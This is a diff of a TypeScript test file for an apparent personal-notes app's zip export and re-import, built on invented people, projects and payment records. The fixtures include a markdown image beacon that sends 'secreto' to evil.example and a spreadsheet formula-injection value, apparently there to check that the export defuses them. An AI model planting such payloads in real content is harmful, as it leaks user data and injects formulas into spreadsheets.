@@ -1,26 +1,15 @@
 import { execFileSync } from "node:child_process";
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { dirname, join } from "node:path";
+import { join } from "node:path";
 import { ensureSystemTypes } from "@boni/agent";
-import { label } from "@boni/entities";
-import { openUserStore, type UserStore } from "@boni/store";
-import { importVault } from "@boni/vault-import";
+import { type FieldDef, label, type TypeDef } from "@boni/entities";
+import { openUserStore, type UserStore, type Writes } from "@boni/store";
 import { afterEach, describe, expect, it } from "vitest";
 import { exportChunks, exportFiles, exportZip } from "./export.ts";
 import { ExportFormatError, importExport } from "./reimport.ts";
 import { entryData, readZip, writeZip, type ZipEntry, ZipError, zipChunks } from "./zip.ts";
 
-/** An invented vault (never real notes): people, projects with relations, movements, a calendar. */
-const FILES: Record<string, string> = {
-  "registros/personas/ana-ejemplo.md": "---\ntype: person\ntags: [ucam, profesor]\n---\n# Ana\n",
-  "registros/personas/luis-ejemplo.md": "---\ntype: person\ntags: [amigo]\n---\n",
-  "registros/finanzas/movimientos/2026/10/2026-10-19-cafe.md":
-    '---\ntype: movement\ndate: "2026-10-19"\namount: -1.6\ncurrency: EUR\npeople: ["[[ana-ejemplo]]", "[[luis-ejemplo]]"]\n---\n',
-  "proyectos/curso-ejemplo.md":
-    '---\ntype: project\nstatus: activo\nparent: "[[programa-ejemplo]]"\n---\nNotas.\n',
-  "proyectos/programa-ejemplo.md": "---\ntype: project\nstatus: activo\n---\n",
-};
 const NOW = Date.UTC(2026, 9, 20, 12);
 const cleanups: (() => void)[] = [];
 afterEach(() => {
@@ -32,22 +21,140 @@ function store(): UserStore {
   cleanups.push(() => s.close());
   return s;
 }
+
+/** Collections made as Juan's import made them (never real data): fields by key, the hidden path of each note. */
+const SCHEMA = label("imported", "public", [{ kind: "vault", id: "import" }]);
+const META = { actor: "import" as const, run: "import-1" };
+const field = (key: string, type: FieldDef["type"], extra: Partial<FieldDef> = {}): FieldDef => ({
+  id: `f_${key.replace(/-/g, "_")}`,
+  key,
+  name: key,
+  type,
+  label: SCHEMA,
+  ...extra,
+});
+const PATH = field("vault-path", "text", {
+  id: "f_vault_path",
+  name: "Nota del vault",
+  hidden: true,
+});
+function makeType(
+  s: UserStore,
+  key: string,
+  name: string,
+  fields: FieldDef[],
+  extra: Partial<TypeDef> = {},
+) {
+  const def: TypeDef = {
+    id: `t_${key.replace(/-/g, "_")}`,
+    key,
+    name,
+    fields: [field("title", "text", { name: "Título" }), ...fields, PATH],
+    titleField: "f_title",
+    sensitivity: "personal",
+    schemaVersion: 1,
+    label: SCHEMA,
+    ...extra,
+  };
+  s.applySchema({ op: "create_type", type: def }, META);
+  return def.id;
+}
+/** An entry with its note's values, every one `imported` from that note. */
+function entry(
+  s: UserStore,
+  type: string,
+  path: string,
+  values: Record<string, unknown>,
+  body?: string,
+) {
+  const l = label("imported", "personal", [{ kind: "vault", id: path }]);
+  const writes: Writes = { f_vault_path: { value: path, label: l } };
+  for (const [k, v] of Object.entries(values)) writes[`f_${k}`] = { value: v, label: l };
+  if (body) writes.$body = { value: body, label: l };
+  return s.create(type, writes, META).entity.id;
+}
+const option = (name: string) => ({ id: `o_${name}`, name, label: SCHEMA });
+
+/** People, projects with relations, a movement (invented): as they came into Boni. */
 function filled(): UserStore {
-  const root = mkdtempSync(join(tmpdir(), "boni-export-"));
-  cleanups.push(() => rmSync(root, { recursive: true, force: true }));
-  for (const [p, text] of Object.entries(FILES)) {
-    mkdirSync(dirname(join(root, p)), { recursive: true });
-    writeFileSync(join(root, p), text);
-  }
   const s = store();
-  importVault(root, s, { apply: true, run: "import-1", now: NOW });
+  const persona = makeType(
+    s,
+    "persona",
+    "Persona",
+    [
+      field("type", "text"),
+      field("tags", "multiselect", { options: ["ucam", "profesor", "amigo"].map(option) }),
+    ],
+    { thirdParty: true },
+  );
+  const proyecto = makeType(s, "proyecto", "Proyecto", [
+    field("type", "text"),
+    field("status", "text"),
+  ]);
+  s.applySchema(
+    {
+      op: "add_field",
+      type: proyecto,
+      field: field("parent", "relation", { relation: { target: proyecto, many: false } }),
+    },
+    META,
+  );
+  const movimiento = makeType(
+    s,
+    "movimiento",
+    "Movimiento",
+    [
+      field("type", "text"),
+      field("date", "date"),
+      field("amount", "number"),
+      field("currency", "text"),
+    ],
+    { sensitivity: "sensitive" },
+  );
+  // Links once the collections they point to exist (as the import and the re-import add them).
+  s.applySchema(
+    {
+      op: "add_field",
+      type: movimiento,
+      field: field("people", "relation", { relation: { target: persona, many: true } }),
+    },
+    META,
+  );
+  const ana = entry(s, persona, "registros/personas/ana-ejemplo.md", {
+    title: "Ana",
+    type: "person",
+    tags: ["o_ucam", "o_profesor"],
+  });
+  const luis = entry(s, persona, "registros/personas/luis-ejemplo.md", {
+    title: "luis-ejemplo",
+    type: "person",
+    tags: ["o_amigo"],
+  });
+  entry(s, movimiento, "registros/finanzas/movimientos/2026/10/2026-10-19-cafe.md", {
+    title: "2026-10-19-cafe",
+    type: "movement",
+    date: "2026-10-19",
+    amount: -1.6,
+    currency: "EUR",
+    people: [ana, luis],
+  });
+  const programa = entry(s, proyecto, "proyectos/programa-ejemplo.md", {
+    title: "programa-ejemplo",
+    type: "project",
+    status: "activo",
+  });
+  entry(
+    s,
+    proyecto,
+    "proyectos/curso-ejemplo.md",
+    { title: "curso-ejemplo", type: "project", status: "activo", parent: programa },
+    "Notas.\n",
+  );
   const mail = label("external", "personal", [{ kind: "mail", id: "m1" }], true);
   const own = label("user", "personal", [{ kind: "turn", id: "t" }]);
-  const ana = s
-    .list("t_persona")
-    .find((x) => x.entity.values.f_vault_path === "registros/personas/ana-ejemplo.md");
   s.update(
-    ana?.entity.id as string,
+    ana,
     {
       $body: { value: "De un correo: ![x](https://evil.example/p.png?d=secreto)", label: mail },
       f_type: { value: '=HYPERLINK("https://evil.example")', label: mail },
@@ -63,6 +170,26 @@ function filled(): UserStore {
   return s;
 }
 const text = (files: Map<string, Buffer>, p: string) => files.get(p)?.toString("utf8") ?? "";
+
+/** A folder of a private zone as Juan imported it: a row per attachment, kept from every model. */
+function zoneFiles(s: UserStore, files: Record<string, string>) {
+  const type = makeType(s, "private-documentos", "Documentos", [
+    field("boni-archivo", "file", { id: "f_boni_file", name: "Archivo" }),
+  ]);
+  s.setZone(type, "private", "import");
+  for (const [name, content] of Object.entries(files)) {
+    const l = label("imported", "personal", [{ kind: "vault", id: `private/Documentos/${name}` }]);
+    s.create(
+      type,
+      {
+        f_title: { value: name, label: l },
+        f_boni_file: { value: s.putFile(Buffer.from(content), "application/pdf"), label: l },
+        f_vault_path: { value: `private/Documentos/${name}`, label: l },
+      },
+      META,
+    );
+  }
+}
 
 describe("a zip written a piece at a time", () => {
   it("reads back the same as one written whole, also with the system's unzip", () => {
@@ -204,12 +331,8 @@ describe("the export comes back", () => {
   });
 
   it("carries a zone's attachments and keeps the zone when re-imported", () => {
-    const zone = mkdtempSync(join(tmpdir(), "boni-zone-"));
-    cleanups.push(() => rmSync(zone, { recursive: true, force: true }));
-    mkdirSync(join(zone, "Documentos"));
-    writeFileSync(join(zone, "Documentos/poliza.pdf"), "%PDF-1.7 inventado");
     const a = store();
-    importVault(zone, a, { apply: true, zone: "private", now: NOW });
+    zoneFiles(a, { "poliza.pdf": "%PDF-1.7 inventado" });
     const sha = String(a.list("t_private_documentos")[0]?.entity.values.f_boni_file);
     const files = new Map(exportFiles(a, { now: NOW }).map((e) => [e.path, entryData(e)]));
     expect(text(files, `files/${sha}`)).toBe("%PDF-1.7 inventado");
@@ -225,13 +348,8 @@ describe("the export comes back", () => {
   });
 
   it("streams: an attachment is read only when its turn comes, and the chunks are the same zip", () => {
-    const zone = mkdtempSync(join(tmpdir(), "boni-zone-"));
-    cleanups.push(() => rmSync(zone, { recursive: true, force: true }));
-    mkdirSync(join(zone, "Documentos"));
-    writeFileSync(join(zone, "Documentos/uno.pdf"), "%PDF-1.7 uno inventado");
-    writeFileSync(join(zone, "Documentos/dos.pdf"), "%PDF-1.7 dos inventado");
     const a = store();
-    importVault(zone, a, { apply: true, zone: "private", now: NOW });
+    zoneFiles(a, { "uno.pdf": "%PDF-1.7 uno inventado", "dos.pdf": "%PDF-1.7 dos inventado" });
     let reads = 0;
     const counted = new Proxy(a, {
       get: (t, k) =>
